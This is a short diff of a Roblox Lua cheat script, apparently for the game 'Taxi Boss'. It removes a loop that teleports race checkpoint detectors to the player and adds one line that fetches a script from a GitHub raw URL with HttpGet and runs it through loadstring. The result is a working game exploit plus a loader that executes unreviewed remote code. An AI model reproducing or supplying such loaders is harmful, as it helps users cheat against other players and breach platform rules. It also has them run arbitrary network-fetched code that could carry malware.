@@ -1,5 +1,1 @@
-for i,v in pairs(game:GetService("Workspace").Races.circuit.detects:GetChildren()) do
-wait()
-v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-v.Transparency = 0.975
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/Taxi%20Boss", true))()
